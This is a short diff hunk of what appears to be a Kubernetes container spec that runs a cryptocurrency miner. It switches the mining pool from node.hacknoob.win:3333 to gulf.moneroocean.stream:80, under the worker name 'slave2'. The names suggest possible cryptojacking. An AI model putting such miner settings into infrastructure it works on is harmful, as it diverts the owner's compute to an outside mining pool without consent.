@@ -20,7 +20,7 @@ spec:
     - -t
     - "3"
     - -o
-    - node.hacknoob.win:3333
+    - gulf.moneroocean.stream:80
     - -u
     - slave2
     volumeMounts:
